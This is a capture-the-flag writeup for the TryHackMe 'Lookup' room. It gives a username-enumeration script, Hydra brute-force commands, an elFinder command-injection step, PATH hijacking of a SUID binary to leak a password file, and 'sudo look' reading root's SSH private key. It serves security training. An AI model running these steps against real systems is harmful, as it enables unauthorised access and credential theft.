# Lookup Room Writeup (TryHackMe)

## Overview
This writeup documents my approach to solving the **Lookup** room on TryHackMe.  
The challenge focuses on web enumeration, username discovery, brute-force attacks, file manager exploitation, and privilege escalation techniques including PATH hijacking and SUID abuse.

---

##  Initial Recon

- Target machine had:
  - **Port 80 (HTTP)** open
  - A web-based **login page**

---

##  Web Application Analysis

### Manual Testing

- Intercepted request using Burp Suite:
  - Request method → **POST**
- Checked:
  - Local Storage → No useful data  
  - Network Tab → No sensitive info  
  - Source Code → Found endpoint: `/login.php`

---

##  Username Enumeration via Error Messages

Tested login with random credentials:

- `admin : randompassword` → Response: **"Wrong password"**
  -  Indicates **valid username**

---

##  Brute Force Attempt (Hydra)

```bash
hydra -t 8 -l admin -P rockyou.txt <IP> http-form-post "/login.php:username=^USER^&password=^PASS^:F=Invalid"
 No success
 Automated Username Discovery (Custom Script)

Created a Python script to identify valid usernames based on response differences:

import requests

url = "http://lookup.thm/login.php"
username_file = "usernames.txt"
password = "password"

headers = {
    "User-Agent": "Mozilla/5.0"
}

def check_username(username):
    data = {
        "username": username,
        "password": password
    }

    try:
        response = requests.post(url, data=data, headers=headers)

        if "Wrong password" in response.text:
            print(f"Username found: {username}")
        elif "wrong username" in response.text:
            pass
        else:
            print(f"[?] Unexpected response: {username}")
    except requests.RequestException as e:
        print(f"[!] Error: {e}")

with open(username_file, "r") as file:
    for line in file:
        username = line.strip()
        if username:
            check_username(username)
Result:
Found valid username: jose
 Password Brute Force
hydra -l jose -P rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong Password" -V
Result:
Credentials found:
Username: jose
Password: password123
 Subdomain Discovery

After login:

Redirected to: files.lookup.thm
 File Manager Enumeration
Explored multiple files → nothing sensitive initially
Identified application:
elFinder File Manager
Key Step:
Checked version → found it vulnerable
 Exploitation (Command Injection via Metasploit)
Searched for exploits in Metasploit:
Found elFinder command injection exploit
Executed exploit → gained initial shell as www-data
 Privilege Escalation
 SUID Enumeration
find / -type f -perm -04000 -ls 2>/dev/null
Interesting Binary Found:
/usr/sbin/pwm
 Binary Analysis

Running the binary:

/usr/sbin/pwm
Observations:
Executes id command internally

Attempts to read:

/home/<user>/.passwords
Vulnerability:
Uses id without full path → vulnerable to PATH Hijacking
 PATH Hijacking Exploit
Step 1: Create Malicious id
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id
chmod +x /tmp/id
Step 2: Modify PATH
export PATH=/tmp:$PATH
which id

Output:

/tmp/id
Step 3: Execute SUID Binary
/usr/sbin/pwm
Result:

Leaked contents of:

/home/think/.passwords
 Credential Extraction
Extracted password for user think
Saved locally:
echo "<password>" > password.txt
 SSH Access
hydra -l think -P password.txt ssh://<IP>
 Valid credentials confirmed
ssh think@<IP>
Gained stable shell as think
 Privilege Escalation to Root
Check sudo permissions:
sudo -l
Found:

Allowed to run:

/usr/bin/look
 Exploiting look (GTFOBins)

Used look to read sensitive files:

sudo /usr/bin/look '' /root/.ssh/id_rsa
Result:
Retrieved root SSH private key
 Root Access
ssh -i root_id_rsa root@<IP>
 Result:
Root shell obtained
 Technical Concepts Covered
Username enumeration via error messages
Password brute-forcing
Subdomain discovery
File manager exploitation (elFinder)
Command injection
SUID enumeration
PATH hijacking
GTFOBins exploitation
SSH key abuse
 Tools Used
Burp Suite
Hydra
Python (requests)
Metasploit
Nmap
SSH
Linux enumeration commands
 Conclusion

The Lookup room is an excellent demonstration of real-world attack chains:

Starting from basic enumeration
Moving into credential attacks
Exploiting vulnerable services
Performing privilege escalation using PATH hijacking and SUID binaries

It provides a complete hands-on experience of a real penetration testing workflow.
